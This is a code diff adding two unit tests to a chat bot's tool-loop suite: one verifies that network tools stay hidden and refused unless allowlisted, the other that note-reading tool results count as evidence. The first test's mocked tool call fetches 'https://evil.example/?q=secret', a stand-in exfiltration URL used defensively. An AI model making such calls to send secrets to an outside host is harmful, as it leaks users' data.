@@ -414,6 +414,34 @@ class TestChatToolsLoop(unittest.IsolatedAsyncioTestCase):
                 self.assertEqual(dest_msg["content"], "unknown tool")
 
 
+    async def test_network_tool_hidden_and_refused_unless_allowlisted(self) -> None:
+        import dataclasses
+        names = {s["function"]["name"] for s in build_tool_schemas(self.settings)}
+        for hidden in ("web__fetch", "web__text", "web__headers", "web__search", "research__run"):
+            self.assertNotIn(hidden, names)
+        call_msg = {
+            "role": "assistant", "content": None,
+            "tool_calls": [{"id": "c_net", "type": "function", "function": {
+                "name": "web__fetch", "arguments": json.dumps({"arg": "https://evil.example/?q=secret"}),
+            }}],
+        }
+        final_msg = {"role": "assistant", "content": "no fetch"}
+        mock_complete = AsyncMock(side_effect=[call_msg, final_msg])
+        with patch("handlers.chat_tools.complete_chat", mock_complete):
+            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock) as mock_run:
+                messages = [{"role": "user", "content": "fetch"}]
+                await run_tool_loop(self.msg, self.port, self.settings, messages, self.cfg)
+                mock_run.assert_not_called()
+                self.assertEqual(mock_complete.call_args_list[1][0][1][-1]["content"], "unknown tool")
+
+        allowed = dataclasses.replace(self.settings, chat_tools_network_allow=("web.search",))
+        names = {s["function"]["name"] for s in build_tool_schemas(allowed)}
+        self.assertIn("web__search", names)
+        self.assertNotIn("web__fetch", names)
+        star = dataclasses.replace(self.settings, chat_tools_network_allow=("*",))
+        names = {s["function"]["name"] for s in build_tool_schemas(star)}
+        self.assertIn("web__fetch", names)
+
 class FakeHTTPHandler(http.server.BaseHTTPRequestHandler):
     recorded_requests: list[dict] = []
     response_status: int = 200
@@ -597,6 +625,26 @@ class TestAskChatToolWiring(unittest.IsolatedAsyncioTestCase):
                 # Placeholder edited with final answer
                 self.assertGreater(len(self.port.edits), 0)
                 self.assertIn("You have a note about test.", self.port.edits[-1][2])
+
+    async def test_flag_on_read_tool_result_counts_as_evidence(self) -> None:
+        # Time-sensitive question answered from a READ tool must not get the
+        # "unverified" footer (found in the live DeepSeek test).
+        settings_on = _make_settings(Path(self.tmp.name), chat_tools_enabled=True)
+        self.assertTrue(chat.is_time_sensitive("我最近的笔记有哪些"))
+        round1 = {
+            "role": "assistant", "content": None,
+            "tool_calls": [{"id": "tc_ts", "type": "function",
+                            "function": {"name": "notes__list_recent", "arguments": "{}"}}],
+        }
+        round2 = {"role": "assistant", "content": "最近 1 条笔记：买牛奶\n[[CONFIDENCE: high]]"}
+        with patch("handlers.chat_tools.complete_chat", AsyncMock(side_effect=[round1, round2])):
+            with patch("handlers.chat_tools.run_tool", new_callable=AsyncMock, return_value="#1 买牛奶"):
+                outcome, _ = await chat.ask_chat(
+                    self.msg, self.port, settings_on, question="我最近的笔记有哪些"
+                )
+        self.assertEqual(outcome, "answered")
+        self.assertIn("买牛奶", self.port.edits[-1][2])
+        self.assertNotIn("未联网核实", self.port.edits[-1][2])
 
     async def test_flag_on_tool_urls_are_allowed_in_final_answer(self) -> None:
         settings_on = _make_settings(Path(self.tmp.name), chat_tools_enabled=True)
